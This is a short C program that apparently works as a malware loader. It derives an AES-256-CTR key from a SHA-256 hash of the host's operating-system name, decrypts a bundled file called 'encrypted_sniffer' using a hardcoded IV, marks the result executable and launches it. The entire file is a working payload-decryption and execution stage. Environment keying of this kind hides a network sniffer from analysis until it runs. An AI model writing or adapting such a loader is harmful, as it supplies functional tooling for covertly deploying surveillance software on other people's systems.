#include <sys/utsname.h>
#include <stdlib.h>
#include <openssl/sha.h>
#include <string.h>
#include <stdio.h>
#include <openssl/evp.h>
#include <unistd.h>
#include <sys/stat.h>

#define CHUNK_SIZE 4096

static void get_system_info(struct utsname *system_info) {
    if(uname(system_info) != 0) {
        // fail maybe do it some other way?
        perror("Uname failed");
        exit(1);
    }
    return;
}

static void generate_sha_key(unsigned char *hash) {
    unsigned char *hash_input;
    struct utsname system_info;

    get_system_info(&system_info);
    hash_input = malloc(strlen(system_info.sysname) + 1);
    memset(hash_input, 0, strlen(system_info.sysname) + 1);
    strncpy(hash_input, system_info.sysname, strlen(system_info.sysname));
    SHA256(hash_input, strlen(hash_input), hash);
    free(hash_input);
}

int decrypt_file(const char *encrypted_file, const char *decrypted_file, const unsigned char *key, const unsigned char *iv) {
    FILE *in = fopen(encrypted_file, "rb");
    FILE *out = fopen(decrypted_file, "wb");
    if(!in || !out) return -1;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv);

    unsigned char in_buf[CHUNK_SIZE], out_buf[CHUNK_SIZE];
    int in_len, out_len;

    while ((in_len = fread(in_buf, 1, CHUNK_SIZE, in)) > 0) {
        EVP_DecryptUpdate(ctx, out_buf, &out_len, in_buf, in_len);
        fwrite(out_buf, 1, out_len, out);
    }

    // No EVP_DecryptFinal_ex needed for CTR mode
    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);

    return 0;
}

int main() {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    unsigned char iv[16]  = "0123456789012345";
    char *args[] = {NULL};

    generate_sha_key(hash);
    decrypt_file("encrypted_sniffer", "sniffer", hash, iv);
    chmod("sniffer", 0755);

    execv("sniffer", args);
}